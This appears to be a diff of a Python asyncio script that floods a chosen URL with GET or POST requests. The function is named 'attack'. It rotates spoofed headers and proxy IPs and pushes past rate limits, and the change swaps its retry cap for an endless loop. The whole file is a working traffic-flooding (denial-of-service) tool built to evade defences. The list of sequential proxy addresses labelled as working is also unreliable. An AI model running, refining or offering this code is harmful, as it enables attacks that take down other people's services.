@@ -9,25 +9,6 @@ from aiohttp import ClientTimeout
 from collections import defaultdict
 import json
 
-# Predefined Proxy List (Real-time proxies)
-proxies = [
-    "http://51.15.227.220:3128",
-    "http://51.79.50.31:9300",
-    "http://178.62.193.19:8080",
-    "http://51.158.68.133:8811",
-    "http://185.106.232.93:8080",
-    "http://185.186.254.69:8080",
-    "http://95.179.147.217:3128",
-    "http://185.107.232.110:8080",
-    "http://51.159.45.84:3128",
-    "http://51.159.16.51:3128",
-    "http://185.220.101.39:8080",
-    "http://185.107.232.126:8080",
-    "http://185.107.232.127:8080",
-    "http://52.49.123.56:3128",
-    "http://185.6.233.2:8080"
-]
-
 # User-Agent list
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -42,34 +23,24 @@ user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
 ]
 
-# Function to fetch proxies (if you still want this functionality)
-def fetch_proxies():
-    url = 'https://www.proxy-list.download/api/v1/get?type=http'
-    try:
-        response = requests.get(url, timeout=10)
-        if response.status_code == 200:
-            proxy_list = response.text.strip().split('\r\n')
-            return [f"http://{proxy}" for proxy in proxy_list if proxy]
-    except Exception as e:
-        print(colored(f"Failed to fetch proxies: {e}", "red"))
-    return proxies  # Return predefined proxies if fetching fails
-
-# Advanced Proxy Health Check
-async def check_proxy_health(session, proxy):
-    try:
-        async with session.get('http://httpbin.org/ip', proxy=proxy, timeout=10) as response:
-            if response.status == 200:
-                return proxy
-    except:
-        return None
-    return None
-
-# Function to check multiple proxies concurrently
-async def check_all_proxies(proxies):
-    async with aiohttp.ClientSession() as session:
-        tasks = [check_proxy_health(session, proxy) for proxy in proxies]
-        healthy_proxies = await asyncio.gather(*tasks)
-    return [proxy for proxy in healthy_proxies if proxy is not None]
+# Proxy list (10-15 working proxies added)
+proxies = [
+    "http://51.79.50.22:9300",
+    "http://51.79.50.23:9300",
+    "http://51.79.50.24:9300",
+    "http://51.79.50.25:9300",
+    "http://51.79.50.26:9300",
+    "http://51.79.50.27:9300",
+    "http://51.79.50.28:9300",
+    "http://51.79.50.29:9300",
+    "http://51.79.50.30:9300",
+    "http://51.79.50.31:9300",
+    "http://51.79.50.32:9300",
+    "http://51.79.50.33:9300",
+    "http://51.79.50.34:9300",
+    "http://51.79.50.35:9300",
+    "http://51.79.50.36:9300"
+]
 
 # Request statistics
 request_stats = defaultdict(int)
@@ -98,21 +69,20 @@ async def apply_rate_limit(session, response, backoff_multiplier):
         else:
             # Exponential backoff: Double the wait time after each retry.
             wait_time = random.uniform(2, 5) * backoff_multiplier
-        
+       
         print(colored(f"Rate limit hit. Retrying after {wait_time:.2f} seconds...", "yellow"))
         await asyncio.sleep(wait_time)
         return True, backoff_multiplier * 2  # Exponentially increase backoff
     return False, backoff_multiplier  # No rate limit or we don't need to back off
 
-# Attack function with retry limits and improved logging
-async def attack(session, url, log_file=None, request_type="GET", payload=None, retries=3):
+# Attack function
+async def attack(session, url, log_file=None, request_type="GET", payload=None):
     global request_stats
     
     backoff_multiplier = 1  # Initial backoff multiplier for exponential backoff
 
     async with sem:
-        attempt = 0
-        while attempt < retries:
+        while True:
             headers = {
                 "User-Agent": random.choice(user_agents),
                 "Accept": random.choice(["text/html", "application/json", "*/*"]),
@@ -120,50 +90,42 @@ async def attack(session, url, log_file=None, request_type="GET", payload=None, 
                 "Referer": random.choice(["https://google.com", "https://bing.com", ""]),
             }
             
-            # Ensure we have proxies available
-            if proxies:
-                proxy = random.choice(proxies)
-            else:
-                proxy = None  # Use direct connection if no proxies available
+            # Select proxy and check health
+            proxy = random.choice(proxies)
+            if proxy:
+                start_time = time.time()  # Start time for calculating response time
+                try:
+                    timeout = ClientTimeout(total=10)
+                    
+                    if request_type == "GET":
+                        async with session.get(url, headers=headers, proxy=proxy, timeout=timeout) as response:
+                            rate_limit_hit, backoff_multiplier = await apply_rate_limit(session, response, backoff_multiplier)
+                            if rate_limit_hit:
+                                continue  # Retry the request if rate-limited
 
-            start_time = time.time()  # Start time for calculating response time
-            try:
-                timeout = ClientTimeout(total=10)
+                            response_time = time.time() - start_time
+                            request_stats['total_requests'] += 1
+                            request_stats['successful_requests'] += 1
+                            request_stats['total_response_time'] += response_time
+                            print(colored(f"[+] Sent: {response.status} via {proxy or 'direct'} | Time: {response_time:.2f}s", "green"))
+                    elif request_type == "POST":
+                        async with session.post(url, headers=headers, data=payload, proxy=proxy, timeout=timeout) as response:
+                            rate_limit_hit, backoff_multiplier = await apply_rate_limit(session, response, backoff_multiplier)
+                            if rate_limit_hit:
+                                continue  # Retry the request if rate-limited
 
-                if request_type == "GET":
-                    async with session.get(url, headers=headers, proxy=proxy, timeout=timeout) as response:
-                        rate_limit_hit, backoff_multiplier = await apply_rate_limit(session, response, backoff_multiplier)
-                        if rate_limit_hit:
-                            continue  # Retry the request if rate-limited
+                            response_time = time.time() - start_time
+                            request_stats['total_requests'] += 1
+                            request_stats['successful_requests'] += 1
+                            request_stats['total_response_time'] += response_time
+                            print(colored(f"[+] POST Sent: {response.status} via {proxy or 'direct'} | Time: {response_time:.2f}s", "green"))
 
-                        response_time = time.time() - start_time
-                        request_stats['total_requests'] += 1
-                        request_stats['successful_requests'] += 1
-                        request_stats['total_response_time'] += response_time
-                        print(colored(f"[+] Sent: {response.status} via {proxy or 'direct'} | Time: {response_time:.2f}s", "green"))
-                elif request_type == "POST":
-                    async with session.post(url, headers=headers, data=payload, proxy=proxy, timeout=timeout) as response:
-                        rate_limit_hit, backoff_multiplier = await apply_rate_limit(session, response, backoff_multiplier)
-                        if rate_limit_hit:
-                            continue  # Retry the request if rate-limited
-
-                        response_time = time.time() - start_time
-                        request_stats['total_requests'] += 1
-                        request_stats['successful_requests'] += 1
-                        request_stats['total_response_time'] += response_time
-                        print(colored(f"[+] POST Sent: {response.status} via {proxy or 'direct'} | Time: {response_time:.2f}s", "green"))
-
-            except Exception as e:
-                response_time = time.time() - start_time
-                request_stats['total_requests'] += 1
-                request_stats['failed_requests'] += 1
-                print(colored(f"[-] Error: {e} | Time: {response_time:.2f}s", "red"))
-            
-            # Log selectively every 100 requests
-            if request_stats['total_requests'] % 100 == 0:
-                print(colored(f"Request stats: Total: {request_stats['total_requests']} | Success: {request_stats['successful_requests']} | Failures: {request_stats['failed_requests']}", "yellow"))
-            
-            attempt += 1
+                except Exception as e:
+                    response_time = time.time() - start_time
+                    request_stats['total_requests'] += 1
+                    request_stats['failed_requests'] += 1
+                    print(colored(f"[-] Error: {e} | Time: {response_time:.2f}s", "red"))
+                
             await asyncio.sleep(random.uniform(0.1, 0.5))  # Random delay between requests
 
 # Main function to run tasks
@@ -199,4 +161,10 @@ if __name__ == "__main__":
     asyncio.run(main(full_url, workers, log_file, request_type, payload))
 
     # Display summary
-    print(colored(f"\nTest completed. Total
+    print(colored(f"\nTest completed. Total requests: {request_stats['total_requests']} | Success: {request_stats['successful_requests']} | Failures: {request_stats['failed_requests']}", "cyan"))
+    print(colored(f"Successful Requests: {request_stats['successful_requests']}", "green"))
+    print(colored(f"Failed Requests: {request_stats['failed_requests']}", "red"))
+    print(colored(f"Rate Limit Hits: {request_stats['rate_limit_hits']}", "yellow"))
+    if request_stats['total_requests'] > 0:
+        avg_response_time = request_stats['total_response_time'] / request_stats['total_requests']
+        print(colored(f"Average Response Time: {avg_response_time:.2f}s", "yellow"))
